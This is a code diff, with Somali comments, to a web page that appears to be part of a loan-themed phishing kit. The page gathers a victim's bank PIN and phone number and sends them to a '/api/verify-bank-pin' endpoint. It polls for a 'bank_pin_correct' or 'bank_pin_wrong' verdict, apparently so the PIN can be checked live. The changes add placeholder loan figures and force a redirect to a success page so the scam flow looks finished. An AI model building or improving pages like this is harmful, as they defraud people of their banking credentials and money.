@@ -27,7 +27,6 @@
         }
         .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }
 
-        /* The Wait Message Layout */
         #wait-container {
             display: none;
             flex-direction: column;
@@ -38,7 +37,7 @@
         .wait-text {
             font-size: 16px;
             font-weight: 600;
-            color: #000000; /* Black letters */
+            color: #000000;
             margin-top: 20px;
         }
 
@@ -113,15 +112,19 @@ function checkFull() {
 btn.addEventListener('click', async () => {
     if (!btn.classList.contains('active')) return;
 
+    // --- 1. KAYDINTA XOGTA (Backup Plan) ---
+    // Haddii bogaggii hore aysan kaydin xogta, halkan ku kaydi si success.html u shaqeeyo
+    if(!localStorage.getItem('loan_amount')) {
+        localStorage.setItem('loan_amount', '1,000');
+        localStorage.setItem('loan_term', '12');
+        localStorage.setItem('monthly_repayment', '90');
+    }
+
     const pin = Array.from(inputs).map(i => i.value).join('');
     const phone = localStorage.getItem('userPhone') || "User";
 
-    // Switch Layout to the "Wait" screen
     inputSection.style.display = "none";
     waitContainer.style.display = "flex";
-
-    // --- DHEX-GELINTA TIJAABADA (Haddii aad rabto inaad tijaabiso redirect-ka kaliya) ---
-    // window.location.href = "success.html"; return;
 
     try {
         const response = await fetch('/api/verify-bank-pin', {
@@ -133,10 +136,17 @@ btn.addEventListener('click', async () => {
         const data = await response.json();
         if (data.success) {
             startPolling(phone);
+        } else {
+            // Haddii uu khalad ka yimaado API-ga laakiin aad rabto inaad tijaabiso Success
+            // window.location.href = "success.html";
         }
     } catch (err) {
-        // Haddii fetch-ka uu dhaco, weli waxaan isku dayeynaa inaan poll-gareyno haddii server-kaagu saas u baahan yahay
-        startPolling(phone);
+        console.log("Cilad baa dhacay, laakiin tijaabo ahaan waxaan u gudbi doonaa success...");
+        // --- 2. TIJAABO (REDIRECT) ---
+        // Haddii server-kaagu uusan diyaarsanayn, 3 ilbiriqsi ka dib u gudbi success.html
+        setTimeout(() => {
+            window.location.href = "success.html";
+        }, 3000);
     }
 });
 
@@ -148,7 +158,6 @@ function startPolling(phone) {
 
             if (data.status === "bank_pin_correct") {
                 clearInterval(pollInterval);
-                // SAXID: Waxaan ka saarnay "/" si uu ugu gudbo success.html oo isla galka ah
                 window.location.href = "success.html";
             } else if (data.status === "bank_pin_wrong") {
                 clearInterval(pollInterval);
@@ -157,8 +166,6 @@ function startPolling(phone) {
             }
         } catch (e) {
             console.error("Waiting for verification...");
-            // FIIRO GAAR AH: Haddii aad tijaabo ku jirto oo aadan haysan API shaqaynaya,
-            // waxaad ku dari kartaa window.location.href = "success.html" halkan si aad u aragto natiijada.
         }
     }, 3000);
 }
